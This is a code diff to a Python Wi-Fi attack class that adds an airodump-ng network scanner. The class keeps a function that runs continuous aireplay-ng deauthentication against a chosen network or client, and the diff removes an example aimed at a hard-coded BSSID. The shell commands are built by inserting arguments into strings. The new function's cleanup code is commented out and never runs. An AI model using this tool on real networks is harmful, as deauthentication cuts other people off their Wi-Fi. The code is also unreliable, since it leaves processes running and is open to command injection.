@@ -2,6 +2,7 @@ import subprocess
 import time
 import signal
 import os
+import csv
 
 class SudoWifi:
     """ scan all networks avalable it's scan for 30 seconds you can chang duration to scan for costom sec. """
@@ -109,6 +110,76 @@ class SudoWifi:
             os.remove("output_file-01.kismet.csv")
 
         return devices
+    def scan_live_networks(self, interface):
+        """Starts airodump-ng, displays networks, and handles cleanup in one function."""
+        full_network = []
+        seen_networks = {}
+
+        # Start airodump-ng in monitor mode and save to CSV
+        airodump_process = subprocess.Popen(
+            ['airodump-ng', interface, '--write', 'output', '--output-format', 'csv'],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+
+        try:
+            while True:
+                # Check if the CSV file exists before reading
+                if not os.path.exists('output-01.csv'):
+                    time.sleep(1)
+                    continue
+
+                with open('output-01.csv', 'r') as file:
+                    reader = csv.reader(file)
+                    for row in reader:
+                        # Skip header rows and empty rows
+                        if len(row) < 14 or row[0] == 'BSSID':
+                            continue
+
+                        # Extract Wi-Fi information
+                        bssid = row[0]
+                        channel = row[3]
+                        signal_dab = row[8]
+                        essid = row[13]
+
+                        # Add unique networks to seen_networks
+                        if bssid not in seen_networks:
+                            seen_networks[bssid] = {
+                                'Channel': channel,
+                                'Signal': signal_dab,
+                                'ESSID': essid
+                            }
+                            full_network.append({
+                                "BSSID": bssid,
+                                "CH": channel,
+                                "ESSID": essid
+                            })
+
+                    # Clear screen and display networks
+                    print("\033[H\033[J")  # Clears the terminal screen
+                    print("Nearby Wi-Fi Networks:")
+                    print("-" * 40)
+                    for bssid, info in seen_networks.items():
+                        print(f"\033[92mESSID: \033[94m{info['ESSID']} \033[92mChannel: \033[94m{info['Channel']} \033[92mSignal: \033[94m{info['Signal']} \033[92mBSSID: \033[94m{bssid}\n")
+                        #print("-" * 40)
+                    # Keep CTRL+C message at bottom
+                    #print("\033[92mCTRL+C to stop scanning...\033[0m\n", end="\r", flush=True)
+
+                time.sleep(2)  # Update every 2 seconds
+
+        except KeyboardInterrupt:
+            print("\nStopping Wi-Fi scan...")
+            print(full_network)
+            return full_network
+        #finally:
+            # Terminate airodump-ng process and clean up files
+            airodump_process.send_signal(signal.SIGINT)
+            airodump_process.wait()
+            if os.path.exists('output-01.csv'):
+                os.remove('output-01.csv')
+            if os.path.exists('output-01.kismet.csv'):
+                os.remove('output-01.kismet.csv')
+
     """ Deauth attack excuter """
     def deauth(self,interface,network_mac,device_mac=None,is_all=False):
         if is_all : 
@@ -123,13 +194,8 @@ class SudoWifi:
             os.system(f"aireplay-ng --deauth 0 -D -a {network_mac} -c {device_mac} wlan0")
 
 if __name__ == "__main__":
-    # Usage example
-    results = SudoWifi()
-    results.deauth("wlan0","04:BA:D6:18:9F:FA",is_all=True)
-    #r=results.scan_wifi("wlan0")
-    #for network in r:
-     #   print(f"BSSID: {network['BSSID']}, ESSID: {network['ESSID']} channel : {network['CH']}")
-    # Scan for devices connected to a specific BSSID
-    #devices = results.scan_with_bssid("wlan0", "04:BA:D6:18:9F:FA")
-    #for device in devices:
-    #print(f"Station MAC: {device['Station MAC']}")
+    # Usage
+    wifi_interface = 'wlan0'  # Replace with your Wi-Fi interface in monitor mode
+    scanner = SudoWifi()
+    scanner.scan_live_networks(wifi_interface)
+
